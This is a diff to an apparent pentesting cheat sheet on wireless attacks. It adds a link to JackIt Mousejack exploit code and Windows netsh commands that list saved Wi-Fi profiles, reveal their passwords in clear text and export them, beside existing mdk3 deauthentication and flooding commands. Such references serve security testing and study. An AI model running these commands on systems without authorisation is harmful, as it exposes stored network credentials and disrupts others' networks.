@@ -17,6 +17,7 @@
 | Flipper | Playground (and dump) of stuff I make or modify for the Flipper Zero | https://github.com/UberGuidoZ/Flipper |
 | flipperzero-firmware | Flipper Zero Code-Grabber Firmware | https://github.com/Eng1n33r/flipperzero-firmware |
 | flipperzero-firmware-wPlugins | Flipper Zero FW [ROGUEMASTER] | https://github.com/RogueMaster/flipperzero-firmware-wPlugins |
+| JackIt | JackIt - Exploit Code for Mousejack Resources | https://github.com/insecurityofthings/jackit |
 | Pwnagotchi | (⌐■_■) - Deep Reinforcement Learning instrumenting bettercap for WiFi pwning. | https://github.com/evilsocket/pwnagotchi |
 | WEF | A fully offensive framework to the 802.11 networks and protocols with different types of attacks for WPA/WPA2 and WEP, automated hash cracking, bluetooth hacking and much more. | https://github.com/D3Ext/WEF |
 | Wifite | This repo is a complete re-write of wifite, a Python script for auditing wireless networks. | https://github.com/derv82/wifite2 |
@@ -49,4 +50,26 @@ $ sudo airmon-ng stop <INTERFACE>
 $ sudo mdk3 <INTERFACE>mon d -c <CHANNEL_NUMBER>
 $ sudo mdk3 <INTERFACE>mon d <BSSID>
 $ sudo mdk3 <INTERFACE>mon b <BSSID>
+```
+
+## Microsoft Windows
+
+### Wireless Profiles
+
+#### List Profiles
+
+```c
+PS C:\> netsh wlan show profiles
+```
+
+#### Extract Passwords
+
+```c
+PS C:\> netsh wlan show profile name="<PROFILE>" key=clear
+```
+
+#### Export Profiles
+
+```c
+PS C:\> netsh wlan export profile name="<PROFILE>" folder=C:\temp
 ```
